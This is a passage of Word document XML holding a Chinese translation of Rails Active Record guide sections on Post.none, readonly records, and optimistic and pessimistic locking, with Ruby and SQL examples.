      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7871"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="2BD83242" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5F49C35A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="339432568"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Post.none # 返回一个空实例对象并且不执行任何查询。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC12D4" w14:paraId="7979D02A" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="200CCA4C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># 以下的 visible_posts 方法期望返回一个关系对象。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25B9818E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@posts</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= current_user.visible_posts.where(:name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; params[:name])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="58ABE40D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55589ACB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>visible_posts</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43372FF1" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  case</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>role</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3737145B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  when</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>'Country Manager'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5714BECC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    Post.where(:country</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; country)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="51E88CD9" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  when</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>'Reviewer'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="61703A85" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    Post.published</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2981EA6B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  when</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>'Bad User'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="780AC623" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    Post.none # =&gt; 这里会返回一个 [] 或者 nil 并且结束调用</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5060208E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12CDBA89" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5133D684" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>10 只读对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CB95826" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Active Record 提供了在 relation 实例对象上调用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>readonly</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法的方式来明确指定不允许修改返回的对象。任何尝试修改只读对象的行为都会失败，并抛出一个 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveRecord::ReadOnlyRecord</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 异常。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3816"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="1C0340BD" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7D778D9B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>client = Client.readonly.first</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E807169" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>client.visits += 1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="508BBDF5" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>client.save</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="43D7593E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">因为 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>client</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 已经被明确指定为一个只读的对象，所以以上的代码在执行 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>client.save</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 时候更新 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>visits</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 时会抛出一个 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveRecord::ReadOnlyRecord</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 异常。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37877D69" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>11 为更新对象加锁</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63E2EF79" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>加锁可以有效防止更新数据库记录时条件表达式竞争而保证更新操作的原子性。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1409D5FE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Active Record 提供了两种加锁机制：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58632D5D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="59"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>乐观锁</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FD03C8C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="59"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>悲观锁</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22AFB90D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>11.1 乐观锁</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A5AFAAB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">乐观锁允许多个用户同时修改同一个对象，它假定数据冲突发生的可能性极小。它检查是否有另外的进程在这个记录打开后修改了这个对象来实现加锁的目地。如果有，那他会抛出一个 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveRecord::StaleObjectError</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 异常并且忽略更新操作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F4F4EE2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>乐观锁在列上加锁</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="409208FF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">为了使用乐观锁，数据表中必须有一个叫做 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lock_version</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 的字段。每次记录更新之后， Active Record 都会增加 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lock_version</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 的数值。如果一个更新请求的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lock_version</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 数值小于数据库中的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lock_version</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ，那更新就会失败，并且抛出一个 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveRecord::StaleObjectError</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 。比如说：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6096"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="6626840C" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3D6FF0C2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ca = Client.find(1)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A741F51" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>c2 = Client.find(1)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23E21BED" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="34562119" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>c1.first_name = "Michael"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6740994A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>c1.save</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3445AA96" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6FAE1C3F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>c2.name = "should fail"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="057EA257" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>c2.save # 抛出一个 ActiveRecord::StaleObjectError</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6EA4B326" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>然后你需要自己负责处理这个冲突，包括继续抛出异常并且回滚，合并或者提交其它业务逻辑以解决这个冲突。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F799D22" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">你可以这样设置： </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveRecord::Base.lock_optimistically = false</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 来关闭这种机制。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="378E0395" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveRecord::Base</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 提供了一个类属性 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>locking_column</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 来修改默认的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lock_version</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 字段：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5616"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="184D5208" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5E2C49FD" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="641F4719" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  self.locking_column = :lock_client_column</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1EF78245" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6950C2E3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>11.2 悲观锁</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A517154" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">悲观锁使用数据库提供的锁机制。当它使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lock</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 来构建一个 relation 实例对象时对返回的记录行加独占锁（写锁）。 relation 实例对象通常在一个事务里面使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lock</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 来防止发生死锁。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01758ED1" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>比如说：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2976"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="61B56631" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="15F49F9A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Item.transaction do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="649B88D9" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  i = Item.lock.first</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3DDDD120" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  i.name = 'Jones'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01AC8428" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  i.save</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5256A99A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="071E5034" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">上面的代码在 MySQL 作为后端数据库时会生成以下 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="10D91229" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="30F78BAC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>SQL (0.2ms) BEGIN</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23B6027A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Item Load</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(0.3ms)  SELECT</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>* FROM</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
